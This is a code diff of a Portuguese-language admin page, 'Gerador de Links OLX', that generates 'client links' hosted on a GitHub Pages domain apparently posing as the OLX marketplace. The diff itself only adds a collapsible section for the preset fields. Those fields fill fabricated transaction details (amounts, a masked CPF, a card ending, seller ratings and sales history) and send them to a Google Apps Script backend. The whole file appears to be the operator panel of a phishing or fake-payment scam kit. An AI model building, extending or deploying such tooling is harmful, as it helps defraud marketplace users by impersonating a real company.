@@ -6,7 +6,7 @@
 <title>Admin - Gerador de Links OLX</title>
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
 <style>
-  /* --- ESTILOS --- */
+  /* --- ESTILOS GERAIS --- */
   body { background:#1e1e1e; color:#fff; font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; padding:20px; margin:0; }
   
   form { 
@@ -72,6 +72,47 @@
   .btn-new:hover { color: #fff; border-color: #fff; }
 
   @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+
+  /* --- NOVOS ESTILOS COLLAPSIBLE --- */
+  .toggle-header {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 10px 15px;
+    margin: 20px -30px 0; /* Ajusta margem para cobrir a largura do form */
+    border-top: 1px solid #444;
+    border-bottom: 1px solid #444;
+    cursor: pointer;
+    background: #3a3a3a;
+    transition: background 0.2s;
+  }
+
+  .toggle-header:hover {
+    background: #444;
+  }
+  
+  .toggle-header p {
+    font-size: 12px;
+    color: #00bfa5; /* Cor do título para contraste */
+    letter-spacing: 1px;
+    font-weight: bold;
+    margin: 0;
+  }
+
+  #preset-fields-container {
+    max-height: 0;
+    overflow: hidden;
+    transition: max-height 0.3s ease-in-out;
+  }
+
+  .toggle-icon {
+    transition: transform 0.3s ease;
+  }
+
+  .toggle-icon.rotated {
+    transform: rotate(180deg);
+    color: #00bfa5;
+  }
 </style>
 </head>
 <body>
@@ -88,36 +129,41 @@
   <label>Taxa de Serviço</label>
   <input type="text" name="taxa" class="money" placeholder="R$ 0,00">
 
-  <hr style="border:0; border-top:1px solid #444; margin: 20px 0;">
-  <p style="font-size:12px; color:#888; text-align:center; letter-spacing:1px;">DADOS PRÉ-DEFINIDOS</p>
+  <div id="preset-toggle" class="toggle-header">
+      <p>DADOS PRÉ-DEFINIDOS</p>
+      <i id="toggle-icon" class="fa-solid fa-chevron-down toggle-icon"></i>
+  </div>
+  
+  <div id="preset-fields-container" class="collapsed">
+    
+    <label>Valor Total</label>
+    <input type="text" name="valor" class="money" value="R$ 1.000,00">
 
-  <label>Valor Total</label>
-  <input type="text" name="valor" class="money" value="R$ 1.000,00">
+    <label>Prazo</label>
+    <input type="text" name="prazo" value="12 horas">
 
-  <label>Prazo</label>
-  <input type="text" name="prazo" value="12 horas">
+    <label>Frete</label>
+    <input type="text" name="frete" class="money" value="R$ 0,00">
 
-  <label>Frete</label>
-  <input type="text" name="frete" class="money" value="R$ 0,00">
+    <label>Tarifa</label>
+    <input type="text" name="tarifa" class="money" value="R$ 0,00">
 
-  <label>Tarifa</label>
-  <input type="text" name="tarifa" class="money" value="R$ 0,00">
+    <label>CPF Mascarado</label>
+    <input type="text" name="cpf" value="406.***.***.01">
 
-  <label>CPF Mascarado</label>
-  <input type="text" name="cpf" value="406.***.***.01">
+    <label>Cartão Mascarado</label>
+    <input type="text" name="cartao" value="Mastercard 4588">
 
-  <label>Cartão Mascarado</label>
-  <input type="text" name="cartao" value="Mastercard 4588">
+    <label>Histórico de Vendas</label>
+    <input type="text" name="vendas" value="08 Vendas nos últimos 06 meses">
 
-  <label>Histórico de Vendas</label>
-  <input type="text" name="vendas" value="08 Vendas nos últimos 06 meses">
+    <label>Avaliação Atendimento</label>
+    <input type="text" name="atendimento" value="Avaliação 4.7/5.0">
 
-  <label>Avaliação Atendimento</label>
-  <input type="text" name="atendimento" value="Avaliação 4.7/5.0">
-
-  <label>Taxa de Entrega</label>
-  <input type="text" name="entrega" value="Taxa de entregues no prazo 07/08">
-
+    <label>Taxa de Entrega</label>
+    <input type="text" name="entrega" value="Taxa de entregues no prazo 07/08">
+    
+  </div>
   <button type="submit" id="btnSalvar">Gerar Link do Cliente</button>
 </form>
 
@@ -146,10 +192,7 @@
 // ⚙️ CONFIGURAÇÃO
 // ========================================================
 
-// MANTENHA ESTA URL, ELA É O SEU BACKEND
 const BACKEND_URL = 'https://script.google.com/macros/s/AKfycbw25mbSP6E1kpFtV0tMy0Y3IMHoUw9_oTu79oOeDqwfDSse5SklzEi3JxPlevsRh5BDsg/exec'; 
-
-// URL DO SEU SITE CLIENTE (GitHub Pages)
 const CLIENTE_URL = 'https://olxltda.github.io/OLX/'; 
 
 // ========================================================
@@ -162,16 +205,39 @@ const btnCopy = document.getElementById('btnCopy');
 const btnView = document.getElementById('btnView');
 const inputLinkPagamento = document.getElementById('linkPagamento');
 
-// --- 1. LÓGICA DE MÁSCARA DE MOEDA (R$) ---
-const moneyInputs = document.querySelectorAll('.money');
+// --- LÓGICA DE COLLAPSIBLE ---
+const toggleHeader = document.getElementById('preset-toggle');
+const fieldsContainer = document.getElementById('preset-fields-container');
+const toggleIcon = document.getElementById('toggle-icon');
 
+const togglePresetFields = () => {
+    // Alterna a classe (usada para o JavaScript)
+    const isExpanded = fieldsContainer.classList.toggle('expanded');
+    
+    // Rotação do ícone
+    toggleIcon.classList.toggle('rotated');
+
+    if (isExpanded) {
+        // Expande: define max-height para a altura real do conteúdo
+        fieldsContainer.style.maxHeight = fieldsContainer.scrollHeight + "px";
+    } else {
+        // Recolhe: define max-height para 0
+        fieldsContainer.style.maxHeight = "0";
+    }
+};
+
+// Define o evento de clique
+toggleHeader.addEventListener('click', togglePresetFields);
+
+
+// --- LÓGICA DE MÁSCARA DE MOEDA (R$) ---
+const moneyInputs = document.querySelectorAll('.money');
 const formatMoney = (value) => {
   value = value.replace(/\D/g, "");
   const amount = parseFloat(value) / 100;
   if (isNaN(amount)) return "";
   return amount.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
 };
-
 moneyInputs.forEach(input => {
   input.addEventListener('input', (e) => e.target.value = formatMoney(e.target.value));
   if(input.value) {
@@ -180,10 +246,9 @@ moneyInputs.forEach(input => {
   }
 });
 
-// --- 2. RECUPERAR ÚLTIMO LINK DA PLANILHA ---
+// --- RECUPERAR ÚLTIMO LINK DA PLANILHA ---
 document.addEventListener('DOMContentLoaded', async () => {
   try {
-    // Tenta carregar o link da última linha da planilha
     const res = await fetch(`${BACKEND_URL}?action=getLastLink`);
     const json = await res.json();
     
@@ -198,7 +263,7 @@ document.addEventListener('DOMContentLoaded', async () => {
   }
 });
 
-// --- 3. ENVIO DO FORMULÁRIO ---
+// --- ENVIO DO FORMULÁRIO ---
 form.addEventListener('submit', async (e) => {
   e.preventDefault();
   
@@ -216,19 +281,16 @@ form.addEventListener('submit', async (e) => {
       body: JSON.stringify(data)
     });
     
-    // O erro anterior era no servidor (Backend). O frontend deve ler o erro retornado:
     const json = await res.json();
 
     if (json.status === 'success') {
       const linkPronto = `${CLIENTE_URL}?id=${json.id}`;
       
-      // Atualiza interface
       linkDisplay.textContent = linkPronto;
-      btnView.href = linkPronto; // Define o link do botão Visualizar
+      btnView.href = linkPronto; 
       
       modal.classList.add('active');
     } else {
-      // Exibe a mensagem de erro detalhada vinda do Backend (ex: 'Sheet BD not found')
       alert('❌ ERRO NO SERVIDOR: ' + json.message);
     }
 
